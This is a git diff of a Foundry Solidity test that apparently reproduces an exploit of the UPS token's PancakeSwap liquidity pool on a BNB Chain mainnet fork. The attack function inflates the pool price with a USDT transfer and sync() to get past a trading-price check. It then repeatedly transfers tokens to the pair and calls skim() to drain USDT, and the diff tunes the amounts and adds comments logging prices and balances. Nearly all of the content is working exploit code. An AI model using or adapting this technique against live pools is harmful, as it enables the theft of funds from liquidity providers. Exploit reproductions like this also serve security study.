@@ -28,21 +28,26 @@ IPancakePairV3 constant USDT_USDC_Pool = IPancakePairV3(
 contract UpsTest is Test {
     function setUp() public {
         vm.createSelectFork("bsc", 37680755 - 1);
-        deal(address(USDT), address(this), 3000000 ether);
+        deal(address(USDT), address(this), 2200000 ether);
+    }
+
+    function print(string memory _txt, uint256 value, uint256 decimal) public {
+        emit log_named_decimal_uint(_txt, value, decimal);
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint(
+        print("Pool USDT", USDT.balanceOf(address(UPS_USDT_Pool)), 18);
+        print(
             "[Begin] Attacker USDT before exploit",
-            USDT.balanceOf(address(this)) - 3000000 ether,
+            USDT.balanceOf(address(this)) - 2200000 ether,
             18
         );
 
         fuckyou();
 
-        emit log_named_decimal_uint(
+        print(
             "[End] Attacker USDT after exploit",
-            USDT.balanceOf(address(this)) - 3000000 ether,
+            USDT.balanceOf(address(this)) - 2200000 ether,
             18
         );
     }
@@ -62,12 +67,26 @@ contract UpsTest is Test {
 
     function fuckyou() public {
         USDT.approve(address(PancakeV2Router), type(uint256).max);
+        // price ->
+        // 0.000012738946733044 current
+        // 0.000500000000000000  < require
 
-        USDT.transfer(address(UPS_USDT_Pool), 2000000 ether);
+        // for the require(canBuy || getPrice() > 5e14, "can not trade");
+        USDT.transfer(address(UPS_USDT_Pool), 1200000 ether);
         UPS_USDT_Pool.sync();
 
+        // price -> 0.000517604905867042
+        // Pool UPS balance -> 23 7092 6337.655292500467902758
+        // Pool USDT balance -> 123 0278.801339419793360994
+
+        // then can swap
         SwapToken(address(USDT), address(UPSToken), 1000000 ether);
 
+        // price -> 0.001699114028599183
+        // My   UPS balance -> 10 6159 5083.133582563193842493 ether
+        // Pool UPS balance -> 13 0933 1254.521709937274060265 ether
+
+        // change price
         uint256 i = 0;
         uint256 pair_balance = 0;
         uint256 here_balance = 0;
@@ -76,18 +95,20 @@ contract UpsTest is Test {
             pair_balance = UPSToken.balanceOf(address(UPS_USDT_Pool));
             here_balance = UPSToken.balanceOf(address(address(this)));
             // console.log(">>>>", here_balance, pair_balance, "<<<<");
-            if (here_balance > pair_balance) {
-                transfer_amount = pair_balance;
-            } else {
-                transfer_amount = here_balance;
-            }
+            transfer_amount = here_balance > pair_balance
+                ? pair_balance
+                : here_balance;
             UPSToken.transfer(address(UPS_USDT_Pool), transfer_amount);
             UPS_USDT_Pool.skim(address(this));
             i++;
         }
 
+        // Pool UPS price 0.001699114028599183 -> 2228965.932350643357914207
+        // Pool UPS balance: 0.000587531104579700
+        // Pool USDT balance: 223 0278.801339419793360994
+
         i = 0;
-        while (i < 3) {
+        while (i < 5) {
             transfer_amount = UPSToken.balanceOf(address(UPS_USDT_Pool));
             UPSToken.transfer(address(UPS_USDT_Pool), transfer_amount);
             (uint256 r0, uint256 r1, ) = UPS_USDT_Pool.getReserves();
